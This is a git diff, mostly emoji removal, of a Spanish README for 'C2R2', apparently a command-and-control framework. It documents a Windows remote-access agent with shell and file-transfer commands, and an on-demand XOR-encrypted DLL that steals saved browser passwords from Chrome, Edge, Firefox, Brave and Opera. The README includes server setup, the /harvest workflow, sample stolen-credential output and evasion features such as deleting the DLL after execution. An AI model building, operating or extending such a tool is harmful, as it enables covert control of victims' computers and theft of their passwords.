@@ -1,10 +1,10 @@
 # C2R2 - Arquitectura Modular con Stealer DLL
 
-## 🎯 Concepto
+##  Concepto
 
 El agent de C2R2 es **ligero y modular**. Solo incluye funcionalidad básica del C2 (~500 KB) y ejecuta el stealer bajo demanda cuando se necesita.
 
-## 📦 Componentes
+##  Componentes
 
 ### 1. Agent Base (Ligero)
 ```
@@ -12,15 +12,15 @@ agent.exe (~500 KB)
 ```
 
 **Funcionalidades Incluidas**:
-- ✅ Conexión directa al C2 (sin shellcode)
-- ✅ Comandos shell (`whoami`, `dir`, etc.)
-- ✅ Upload/Download de archivos
-- ✅ Recolección de sysinfo (hostname, user, OS, privilegios)
-- ✅ Ejecución de módulos DLL bajo demanda
+-  Conexión directa al C2 (sin shellcode)
+-  Comandos shell (`whoami`, `dir`, etc.)
+-  Upload/Download de archivos
+-  Recolección de sysinfo (hostname, user, OS, privilegios)
+-  Ejecución de módulos DLL bajo demanda
 
 **NO Incluye**:
-- ❌ Stealer de credenciales
-- ❌ Otros módulos pesados
+-  Stealer de credenciales
+-  Otros módulos pesados
 
 ### 2. Módulo Stealer (Bajo Demanda)
 
@@ -46,7 +46,7 @@ El servidor C2 maneja:
 - Envía comando `__HARVEST__`
 - Recibe credenciales robadas
 
-## 🚀 Flujo de Ejecución
+##  Flujo de Ejecución
 
 ### `/harvest` - Robar Credenciales
 
@@ -89,7 +89,7 @@ El servidor C2 maneja:
        │◄──────────────────────────────┤                               │
 ```
 
-## 🔧 Setup del Servidor
+##  Setup del Servidor
 
 ### 1. Estructura de Directorios
 
@@ -142,18 +142,18 @@ Salida:
 ║              Direct Connection - No Shellcode            ║
 ╚═══════════════════════════════════════════════════════════╝
 
-🌐 Listening: 0.0.0.0:4444
-📝 Help: /help
-📂 Logs: logs/
+ Listening: 0.0.0.0:4444
+ Help: /help
+ Logs: logs/
 ```
 
-## 🎮 Uso desde el C2
+##  Uso desde el C2
 
 ### 1. Conectarse al Agent
 
 ```bash
 C2R2> /list
-📋 1 cliente(s) conectado(s)
+ 1 cliente(s) conectado(s)
 ┌────┬───────────────┬──────────────┬──────────┬─────────────┬────────────┬─────────────────────┐
 │ ID │ Dirección     │ Hostname     │ Usuario  │ OS          │ Privilegios│ Conectado           │
 ├────┼───────────────┼──────────────┼──────────┼─────────────┼────────────┼─────────────────────┤
@@ -161,7 +161,7 @@ C2R2> /list
 └────┴───────────────┴──────────────┴──────────┴─────────────┴────────────┴─────────────────────┘
 
 C2R2> /select 1
-✅ Cliente [1]
+ Cliente [1]
 ```
 
 ### 2. Ejecutar `/harvest`
@@ -170,22 +170,22 @@ C2R2> /select 1
 C2R2[1]> /harvest
 
 ╔═══════════════════════════════════════════════════════════╗
-║           🔑 HARVESTING CREDENTIALS [1]                   ║
+║            HARVESTING CREDENTIALS [1]                   ║
 ╚═══════════════════════════════════════════════════════════╝
 
   � Subiendo stealer.enc...
   � Subiendo stealer.key...
   � Ejecutando stealer...
-  🎯 Chrome, Edge, Firefox, Brave, Opera
+   Chrome, Edge, Firefox, Brave, Opera
   ⏳ Esperando credenciales...
 
 ╔═══════════════════════════════════════════════════════════╗
-║         🔑 CREDENCIALES OBTENIDAS [1]                     ║
+║          CREDENCIALES OBTENIDAS [1]                     ║
 ╚═══════════════════════════════════════════════════════════╝
 
-  📊 Total: 42 credenciales
-  💾 Guardado: harvested/credentials_1_20251015_143200.txt
-  📄 Tamaño: 15234 bytes
+   Total: 42 credenciales
+   Guardado: harvested/credentials_1_20251015_143200.txt
+   Tamaño: 15234 bytes
 
 ─────────────────────────────────────────────────────────────
 Browser: Chrome - Profile: Default
@@ -196,16 +196,16 @@ Password: MySecretPass123
 ...
 ```
 
-## 🔒 Seguridad
+##  Seguridad
 
-- ✅ **DLL Encriptada**: XOR con clave aleatoria de 32 bytes
-- ✅ **Transfer Bajo Demanda**: Solo cuando se ejecuta `/harvest`
-- ✅ **Efímero**: DLL se elimina después de ejecutar
-- ✅ **Agent Ligero**: Menos superficie de ataque (~500 KB)
-- ✅ **Sin HTTP**: Usa solo TCP para todo (más simple)
-- ✅ **No Firma**: DLL custom sin firmar
+-  **DLL Encriptada**: XOR con clave aleatoria de 32 bytes
+-  **Transfer Bajo Demanda**: Solo cuando se ejecuta `/harvest`
+-  **Efímero**: DLL se elimina después de ejecutar
+-  **Agent Ligero**: Menos superficie de ataque (~500 KB)
+-  **Sin HTTP**: Usa solo TCP para todo (más simple)
+-  **No Firma**: DLL custom sin firmar
 
-## 📊 Ventajas
+##  Ventajas
 
 | Antes (Monolítico) | Después (Modular) |
 |--------------------|-------------------|
@@ -215,7 +215,7 @@ Password: MySecretPass123
 | Difícil actualizar | Fácil actualizar módulo |
 | Sin flexibilidad | Muy flexible |
 
-## 🐛 Troubleshooting
+##  Troubleshooting
 
 ### "modules/stealer.enc no encontrado"
 ```bash
@@ -225,16 +225,16 @@ cargo run -- encrypt-module
 ```
 
 ### "Error cargando DLL (LoadLibrary failed)"
-- ✅ Verifica que el agent esté en Windows
-- ✅ Verifica que los archivos se subieron correctamente
-- ✅ Revisa permisos en directorio temporal
+-  Verifica que el agent esté en Windows
+-  Verifica que los archivos se subieron correctamente
+-  Revisa permisos en directorio temporal
 
 ### "stealer.enc no encontrado" (en agent)
-- ✅ El servidor debe tenerlo en `modules/stealer.enc`
-- ✅ Ejecuta `encrypt-module` primero
-- ✅ Verifica que el transfer completó
+-  El servidor debe tenerlo en `modules/stealer.enc`
+-  Ejecuta `encrypt-module` primero
+-  Verifica que el transfer completó
 
-## 📝 Notas
+##  Notas
 
 - El módulo stealer **NO** está en Git (solo en `c2r2-server/modules/`)
 - El builder genera los archivos `.enc` y `.key`
